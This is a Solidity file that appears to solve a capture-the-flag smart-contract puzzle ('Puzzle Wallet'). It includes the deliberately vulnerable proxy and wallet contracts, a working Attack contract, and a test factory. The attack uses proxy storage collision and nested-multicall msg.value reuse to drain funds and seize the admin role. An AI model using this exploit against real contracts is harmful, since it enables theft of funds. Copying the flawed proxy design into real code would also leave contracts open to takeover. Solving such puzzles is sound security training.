// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./deps/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    // attack vector (maxBalance = admin)
    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    // 1. call proposeNewAdmin in Proxy
    // 2. call this function from Proxy to pass require statement (owner = pendingAdmin)
    // p.s. - can make attack contract whitelisted if needed
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 0x20))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract Attack {

    function attack(address payable _proxyAddr) external payable {
        require(msg.value == 0.001 ether, "invalid msg.value");

        PuzzleProxy proxy = PuzzleProxy(_proxyAddr);
        // Set pendingAdmin to this contract = set owner to this contract
        proxy.proposeNewAdmin(address(this));
        
        PuzzleWallet impl = PuzzleWallet(_proxyAddr);
        // Add this contract to whitelist (owner = this contract -> will pass require)
        impl.addToWhitelist(address(this));

        bytes[] memory data = multicallCalldata();

        // Call multicall and send 0.001 ether (current victim contract balance)
        impl.multicall{value: msg.value}(data);
        require(_proxyAddr.balance == 0, "victim contract balance not zero");
        
        impl.setMaxBalance(uint256(uint160(msg.sender)));
        require(proxy.admin() == msg.sender, "not the owner");
    }

    function multicallCalldata() public view returns(bytes[] memory) {
        bytes[] memory data = new bytes[](3);
        data[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory innerData = new bytes[](1);
        innerData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, innerData);
        data[2] = abi.encodeWithSelector(PuzzleWallet.execute.selector, msg.sender, 0.002 ether, "");

        return data;
    }
}

// To test in Remix
contract Factory {
    address public proxy;
    address public impl;

    // 1000000000000000 wei
    constructor() payable {
        require(msg.value == 0.001 ether, "invalid amount");
        impl = address(new PuzzleWallet());
        PuzzleProxy _proxy = new PuzzleProxy(msg.sender, impl, abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether));
        proxy = address(_proxy);

        PuzzleWallet target = PuzzleWallet(proxy);
        _proxy.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
        target.deposit{value: msg.value}();
        require(address(target).balance == 0.001 ether, "invalid target balance");
        require(target.balances(address(this)) == 0.001 ether, "invalid balance");
    }
}